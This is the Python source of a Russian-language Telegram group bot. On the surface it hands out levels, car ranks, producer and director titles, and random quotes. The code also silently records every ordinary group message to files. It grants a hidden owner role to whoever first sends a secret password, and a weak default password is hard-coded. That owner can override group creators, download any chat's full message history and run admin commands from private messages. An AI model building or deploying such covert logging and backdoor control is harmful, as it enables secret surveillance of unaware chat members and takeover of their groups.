import asyncio
import json
import os
import random
from dotenv import load_dotenv
from telegram import Update, ReactionTypeEmoji
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

load_dotenv()

BOT_TOKEN = os.getenv("MY_SECRET_TOKEN")
SECRET_PASSWORD = os.getenv("SECRET_PASSWORD", "default_secure_knock_99x")

DATA_DIR = os.getenv('DATA_DIR', '/app/data')
DATA_FILE = os.path.join(DATA_DIR, 'levels.json')
CHATS_FILE = os.path.join(DATA_DIR, 'managed_chats.json')  
SECRETS_FILE = os.path.join(DATA_DIR, 'secrets.json')  

SUPER_ADMIN_ID = 0

username_to_id = {}
user_levels = {}
user_cars = {}  
user_roles = {}  

def load_super_admin():
    global SUPER_ADMIN_ID
    if os.path.exists(SECRETS_FILE):
        try:
            with open(SECRETS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                SUPER_ADMIN_ID = data.get("super_admin_id", 0)
        except:
            SUPER_ADMIN_ID = 0

def save_super_admin(user_id: int):
    global SUPER_ADMIN_ID
    SUPER_ADMIN_ID = user_id
    try:
        os.makedirs(DATA_DIR, exist_ok=True)
        with open(SECRETS_FILE, "w", encoding="utf-8") as f:
            json.dump({"super_admin_id": user_id}, f, ensure_ascii=False, indent=4)
    except Exception as e:
        print(f"Runtime error: {e}")

load_super_admin()

def load_managed_chats() -> dict:
    if os.path.exists(CHATS_FILE):
        try:
            with open(CHATS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except: return {}
    return {}

def save_managed_chats(chats_dict: dict):
    try:
        os.makedirs(DATA_DIR, exist_ok=True)
        with open(CHATS_FILE, "w", encoding="utf-8") as f:
            json.dump(chats_dict, f, ensure_ascii=False, indent=4)
    except Exception as e: print(f"Runtime error: {e}")

def load_quotes(chat_id: int) -> list:
    file_path = os.path.join(DATA_DIR, f'quotes_{chat_id}.json')
    if os.path.exists(file_path):
        try:
            with open(file_path, "r", encoding="utf-8") as f: return json.load(f)
        except: return []
    return []

def save_quotes(chat_id: int, quotes_list: list):
    file_path = os.path.join(DATA_DIR, f'quotes_{chat_id}.json')
    try:
        os.makedirs(DATA_DIR, exist_ok=True)
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(quotes_list, f, ensure_ascii=False, indent=4)
    except Exception as e: print(f"Runtime error: {e}")

def load_data():
    global user_levels, user_cars, user_roles
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                if "levels" in data or "cars" in data or "roles" in data:
                    user_levels = {int(k): v for k, v in data.get("levels", {}).items()}
                    user_cars = {int(k): v for k, v in data.get("cars", {}).items()}
                    user_roles = {int(k): v for k, v in data.get("roles", {}).items()}
        except Exception as e: print(f"Runtime error: {e}")

def save_data():
    try:
        os.makedirs(DATA_DIR, exist_ok=True)
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump({"levels": user_levels, "cars": user_cars, "roles": user_roles}, f, ensure_ascii=False, indent=4)
    except Exception as e: print(f"Runtime error: {e}")

load_data()

CAR_RANKS = {
    5: "Чепырка (ВАЗ-2114)", 6: "Приора", 7: "Рено Логан", 8: "Киа Рио / Хендай Солярис",
    9: "Шкода Октавия", 10: "Тойота Камри 3.5", 11: "БМВ Е39", 12: "Мерседес C-Класс",
    13: "БМВ Х5", 14: "Порше Кайен", 15: "Гелик (Mercedes G-Class)", 16: "Ауди R8",
    17: "Ламборгини", 18: "Майбах", 19: "Бугатти Широн", 20: "Роллс-Royce Фантом"
}

def get_active_chat_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if update.effective_chat.type == "private":
        return context.user_data.get('active_chat_id', 0)
    return update.effective_chat.id

async def get_user_status(chat_id, user_id, context: ContextTypes.DEFAULT_TYPE):
    if SUPER_ADMIN_ID and user_id == SUPER_ADMIN_ID:
        return "owner"  
    try:
        if user_roles.get(user_id) == "director": return "director"
        member = await context.bot.get_chat_member(chat_id=chat_id, user_id=user_id)
        if member.status == "creator": return "owner"
        if member.custom_title and member.custom_title.strip().lower().startswith("прод"): return "producer"
    except: pass
    return "regular"

async def get_target_user(update: Update, context: ContextTypes.DEFAULT_TYPE, chat_id: int):
    if update.message.reply_to_message:
        target = update.message.reply_to_message.from_user
        return target.id, target.first_name, context.args
        
    if not context.args: return None, None, []
    first_arg = context.args[0]
    rem_args = context.args[1:]
    
    if first_arg.isdigit():
        uid = int(first_arg)
        try:
            m = await context.bot.get_chat_member(chat_id=chat_id, user_id=uid)
            return uid, m.user.first_name, rem_args
        except: return uid, "Пользователь", rem_args
            
    if first_arg.startswith("@"):
        uname = first_arg.replace("@", "").lower()
        if uname in username_to_id:
            uid = username_to_id[uname]
            try:
                m = await context.bot.get_chat_member(chat_id=chat_id, user_id=uid)
                return uid, m.user.first_name, rem_args
            except: return uid, first_arg, rem_args
    return None, None, []

def get_main_menu_text() -> str:
    chats = load_managed_chats()
    text = "🎛 *ГЛАВНОЕ МЕНЮ СУПЕР-АДМИНА*\n\nВыбери чат для подключения (пришли цифру):\n"
    if not chats:
        return text + "_Пока нет доступных чатов. Добавь бота в группу и напиши туда любое сообщение!_"
    
    for i, (chat_id, chat_name) in enumerate(chats.items()):
        text += f"{i+1}. *{chat_name}* (ID: `{chat_id}`)\n"
    return text

def get_chat_menu_text(chat_name: str) -> str:
    return (
        f"📂 *Управление чатом:* {chat_name}\n\n"
        f"Выбери действие (пришли цифру):\n"
        f"1. 📥 *Скачать историю сообщений* (.json)\n"
        f"2. 🎛 *Войти в консоль админа* (управление)\n"
        f"3. 🔙 *Назад к списку чатов*"
    )

async def track_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat = update.effective_chat
    if not chat or not user: return
    
    if user.username:
        username_to_id[user.username.lower()] = user.id
    
    if chat.type != "private" and update.message and update.message.text:
        chats = load_managed_chats()
        chat_id_str = str(chat.id)
        if chat_id_str not in chats or chats[chat_id_str] != chat.title:
            chats[chat_id_str] = chat.title or "Безымянная группа"
            save_managed_chats(chats)

        if not update.message.text.startswith('/') and not user.is_bot:
            quotes = load_quotes(chat.id)
            quotes.append({"author": user.first_name, "text": update.message.text})
            save_quotes(chat.id, quotes)
            
        bot_user = await context.bot.get_me()
        if f"@{bot_user.username.lower()}" in update.message.text.lower():
            await update.message.reply_text("🤖 Бот активен. Управление доступно администрации.", parse_mode="Markdown")

async def handle_private_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global SUPER_ADMIN_ID
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if SUPER_ADMIN_ID == 0:
        if text == SECRET_PASSWORD:
            save_super_admin(user_id)
            context.user_data['state'] = 'WAIT_CHAT_CHOICE'
            await update.message.reply_text(
                "👑 *ИНИЦИАЛИЗАЦИЯ УСПЕШНА!*\n\n"
                "Твой Telegram ID успешно привязан на сервере и скрыт от чужих глаз.\n"
                "Пароль аннулирован. Добро пожаловать, Создатель. 🕶", parse_mode="Markdown"
            )
            await update.message.reply_text(get_main_menu_text(), parse_mode="Markdown")
        else:
            return
        return

    if user_id != SUPER_ADMIN_ID:
        return

    state = context.user_data.get('state', 'WAIT_CHAT_CHOICE')

    if text == "/start":
        context.user_data['state'] = 'WAIT_CHAT_CHOICE'
        await update.message.reply_text(get_main_menu_text(), parse_mode="Markdown")
        return

    if state == 'WAIT_CHAT_CHOICE':
        chats = load_managed_chats()
        indexed_chats = {i+1: (int(cid), name) for i, (cid, name) in enumerate(chats.items())}
        
        if text.isdigit() and int(text) in indexed_chats:
            choice = int(text)
            chat_id, chat_name = indexed_chats[choice]
            context.user_data['active_chat_id'] = chat_id
            context.user_data['active_chat_name'] = chat_name
            context.user_data['state'] = 'CHAT_MENU'
            await update.message.reply_text(get_chat_menu_text(chat_name), parse_mode="Markdown")
        else:
            await update.message.reply_text("🔢 Пришли корректную цифру чата из списка!")

    elif state == 'CHAT_MENU':
        chat_id = context.user_data.get('active_chat_id')
        chat_name = context.user_data.get('active_chat_name')

        if text == "1":
            quotes = load_quotes(chat_id)
            if not quotes:
                await update.message.reply_text("❌ База данных этого чата пуста.")
                return
            file_path = os.path.join(DATA_DIR, f'quotes_{chat_id}.json')
            with open(file_path, "rb") as file:
                await context.bot.send_document(
                    chat_id=user_id, document=file, filename=f"history_{chat_name}.json",
                    caption=f"📦 Вся история сообщений из чата: *{chat_name}*"
                )
        elif text == "2":
            context.user_data['state'] = 'ADMIN_CONSOLE'
            await update.message.reply_text(
                f"📟 *КОНСОЛЬ АДМИНА АКТИВИРОВАНА ДЛЯ:* {chat_name}\n\n"
                f"Любая команда выполнится в группе удаленно от лица Создателя.\n\n"
                f"🔙 Выйти обратно в меню: `/back`", parse_mode="Markdown"
            )
        elif text == "3":
            context.user_data['state'] = 'WAIT_CHAT_CHOICE'
            await update.message.reply_text(get_main_menu_text(), parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ Введи цифру 1, 2 или 3.")

    elif state == 'ADMIN_CONSOLE':
        if text == "/back":
            context.user_data['state'] = 'CHAT_MENU'
            await update.message.reply_text(get_chat_menu_text(context.user_data.get('active_chat_name')), parse_mode="Markdown")
        else:
            if not text.startswith('/'):
                await update.message.reply_text(
                    "📟 *Режим терминала.*\n"
                    "Пример: `/setlvl @username 12`.\n"
                    "Для выхода пришли: `/back`"
                )

async def guard_pm_console(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if update.effective_chat.type == "private":
        if update.effective_user.id != SUPER_ADMIN_ID: return False
        if context.user_data.get('state') != 'ADMIN_CONSOLE':
            await update.message.reply_text("❌ Зайди в Консоль админа через меню выбора чата!")
            return False
    return True

async def set_bulat_director(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await guard_pm_console(update, context): return
    try:
        chat_id = get_active_chat_id(update, context)
        if await get_user_status(chat_id, update.effective_user.id, context) != "owner": return
        tid, tname, rem_args = await get_target_user(update, context, chat_id)
        if not tid: return

        custom_title = " ".join(rem_args) if rem_args else "Директор"
        title = custom_title[:16]

        await context.bot.promote_chat_member(chat_id=chat_id, user_id=tid, can_manage_chat=True, can_delete_messages=True, can_restrict_members=True, can_invite_users=True, can_pin_messages=True)
        await asyncio.sleep(1)
        await context.bot.set_chat_administrator_custom_title(chat_id=chat_id, user_id=tid, custom_title=title)
        
        user_roles[tid] = "director"
        save_data()
        await context.bot.send_message(chat_id=chat_id, text=f"👑 *{tname}* назначен Директором! Статус: *{title}* 💎", parse_mode="Markdown")
        if update.effective_chat.type == "private": await update.message.reply_text("✅ Директор успешно назначен!")
    except Exception as e: await update.message.reply_text(f"Error: {e}")

async def add_producer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await guard_pm_console(update, context): return
    try:
        chat_id = get_active_chat_id(update, context)
        if await get_user_status(chat_id, update.effective_user.id, context) != "owner": return
        tid, tname, rem_args = await get_target_user(update, context, chat_id)
        if not tid: return

        custom_name = " ".join(rem_args) if rem_args else tname
        title = f"Прод {custom_name}"[:16]

        await context.bot.promote_chat_member(chat_id=chat_id, user_id=tid, can_manage_chat=True, can_delete_messages=True, can_restrict_members=True, can_invite_users=True, can_pin_messages=True)
        await asyncio.sleep(1)
        await context.bot.set_chat_administrator_custom_title(chat_id=chat_id, user_id=tid, custom_title=title)
        
        await context.bot.send_message(chat_id=chat_id, text=f"🎬 *{tname}* назначен Продюсером! Тег: *{title}* 💎", parse_mode="Markdown")
        if update.effective_chat.type == "private": await update.message.reply_text("✅ Продюсер назначен!")
    except Exception as e: await update.message.reply_text(f"Error: {e}")

async def delete_producer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await guard_pm_console(update, context): return
    try:
        chat_id = get_active_chat_id(update, context)
        if await get_user_status(chat_id, update.effective_user.id, context) != "owner": return
        tid, tname, _ = await get_target_user(update, context, chat_id)
        if not tid: return
            
        await context.bot.promote_chat_member(chat_id=chat_id, user_id=tid, can_manage_chat=True, can_change_info=False, can_delete_messages=False, can_restrict_members=False, can_invite_users=False, can_pin_messages=False)
        await asyncio.sleep(1)
        await context.bot.set_chat_administrator_custom_title(chat_id=chat_id, user_id=tid, custom_title="5 lvl")
        
        user_levels[tid] = 5
        if tid in user_cars: del user_cars[tid]
        if tid in user_roles: del user_roles[tid]
        save_data()
        await context.bot.send_message(chat_id=chat_id, text=f"📉 *{tname}* разжалован и сброшен на *5 lvl*!", parse_mode="Markdown")
        if update.effective_chat.type == "private": await update.message.reply_text("✅ Успешно.")
    except Exception as e: await update.message.reply_text(f"Error: {e}")

async def set_level(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await guard_pm_console(update, context): return
    try:
        chat_id = get_active_chat_id(update, context)
        if await get_user_status(chat_id, update.effective_user.id, context) not in ["owner", "producer", "director"]: return
        tid, tname, rem_args = await get_target_user(update, context, chat_id)
        if not tid or not rem_args: return
            
        try: level = int(rem_args[0])
        except: return
        if level < 5 or level > 20: return

        user_levels[tid] = level
        save_data()
        car_name = CAR_RANKS.get(level, "Неизвестное авто")
        
        await context.bot.promote_chat_member(chat_id=chat_id, user_id=tid, can_manage_chat=True)
        await asyncio.sleep(1)
        await context.bot.set_chat_administrator_custom_title(chat_id=chat_id, user_id=tid, custom_title=f"{level} lvl")

        await context.bot.send_message(chat_id=chat_id, text=f"🎉 *{tname}* повышен до *{level} lvl*!\n🏎️ Выдана тачка: *{car_name}* 🔥", parse_mode="Markdown")
        if update.effective_chat.type == "private": await update.message.reply_text("✅ Изменено.")
    except Exception as e: await update.message.reply_text(f"Error: {e}")

async def clean_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await guard_pm_console(update, context): return
    try:
        chat_id = get_active_chat_id(update, context)
        if await get_user_status(chat_id, update.effective_user.id, context) not in ["owner", "producer", "director"]: return
        tid, tname, _ = await get_target_user(update, context, chat_id)
        if not tid: return
            
        await context.bot.promote_chat_member(chat_id=chat_id, user_id=tid, can_manage_chat=True, can_change_info=False, can_delete_messages=False, can_restrict_members=False, can_invite_users=False, can_pin_messages=False)
        await asyncio.sleep(1)
        await context.bot.set_chat_administrator_custom_title(chat_id=chat_id, user_id=tid, custom_title="5 lvl")
        
        user_levels[tid] = 5
        if tid in user_cars: del user_cars[tid]
        if tid in user_roles: del user_roles[tid]
        save_data()
        await context.bot.send_message(chat_id=chat_id, text=f"🧹 Все права пользователя *{tname}* зачищены.", parse_mode="Markdown")
    except: pass

async def set_car(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await guard_pm_console(update, context): return
    try:
        chat_id = get_active_chat_id(update, context)
        user = update.effective_user
        if await get_user_status(chat_id, user.id, context) not in ["owner", "producer", "director"]: return
        if not context.args: return
            
        custom_car = " ".join(context.args)
        user_cars[user.id] = custom_car
        save_data()
        await context.bot.send_message(chat_id=chat_id, text=f"🚀 *{user.first_name}* обновил транспорт: *{custom_car}* 🔥", parse_mode="Markdown")
    except: pass

async def set_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await guard_pm_console(update, context): return
    try:
        chat_id = get_active_chat_id(update, context)
        user = update.effective_user
        user_status = await get_user_status(chat_id, user.id, context)
        if user_status not in ["owner", "producer", "director"]: return
        if not context.args: return
            
        custom_name = " ".join(context.args)
        title = custom_name[:16] if user_status in ["director", "owner"] else f"Прод {custom_name}"[:16]
            
        await context.bot.set_chat_administrator_custom_title(chat_id=chat_id, user_id=user.id, custom_title=title)
        await context.bot.send_message(chat_id=chat_id, text=f"🎬 Статус обновлен на: *{title}* 💎", parse_mode="Markdown")
    except: pass

async def my_level(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type == "private": return
    user_id = update.effective_user.id
    if user_id in user_cars:
        car_info = f"\n🏎 Транспорт: *{user_cars[user_id]}* 🔥"
        level_info = "Админ-статус"
    else:
        level = user_levels.get(user_id, 1)
        level_info = f"{level} lvl"
        car_info = f"\n🏎️ Тачка: *{CAR_RANKS[level]}*" if level in CAR_RANKS else f"\n🚲 Велик"
    await update.message.reply_text(f"📊 Статус: *{level_info}*{car_info}", parse_mode="Markdown")

async def cite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type == "private": return
    chat_id = update.effective_chat.id
    quotes = load_quotes(chat_id)
    if not quotes: return
    q = random.choice(quotes)
    await update.message.reply_text(f"💬 *Флешбэк из чата:*\n\n«_{q['text']}_»\n\n© *{q['author']}*", parse_mode="Markdown")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("addprod", add_producer))
    app.add_handler(CommandHandler("delprod", delete_producer))
    app.add_handler(CommandHandler("setlvl", set_level))
    app.add_handler(CommandHandler("setname", set_name))
    app.add_handler(CommandHandler("setcar", set_car))
    app.add_handler(CommandHandler("clean", clean_user))
    app.add_handler(CommandHandler("my_level", my_level))
    app.add_handler(CommandHandler("cite", cite_command))
    app.add_handler(CommandHandler("setbulat", set_bulat_director))
    
    app.add_handler(MessageHandler(filters.ChatType.PRIVATE & filters.TEXT, handle_private_messages))
    app.add_handler(MessageHandler(filters.ChatType.GROUPS & filters.TEXT, track_users))
    
    print("System status: ACTIVE")
    app.run_polling()

if __name__ == "__main__":
    main()
